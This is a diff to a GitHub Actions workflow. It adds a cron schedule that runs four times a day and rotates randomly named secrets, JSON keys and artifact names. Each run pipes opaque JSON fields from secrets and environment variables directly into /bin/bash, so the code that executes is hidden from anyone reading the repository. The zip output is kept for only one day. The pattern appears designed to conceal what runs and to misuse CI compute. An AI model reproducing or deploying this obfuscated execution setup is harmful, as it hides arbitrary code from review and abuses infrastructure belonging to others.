@@ -2,6 +2,8 @@ name: CI
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '19 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,15 +17,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          dxiq60: ${{ secrets.dxiq60 }}
+          sojws70609: ${{ secrets.sojws70609 }}
         run: |
-          printf '%s' "$dxiq60" | jq -r .pobm0526 | /bin/bash
-          echo $ompm59 | jq -r .xpwmr4 | /bin/bash
-          printf '%s' "$u00" | jq -r .nhsf30 | /bin/bash
+          printf '%s' "$sojws70609" | jq -r .ez1368 | /bin/bash
+          echo $cvq99 | jq -r .kxb371 | /bin/bash
+          printf '%s' "$nkji74334" | jq -r .fb6647 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
         with:
-          name: 1lOhXaBT
+          name: 4zOce5lY
           path: "*.zip"
           retention-days: 1
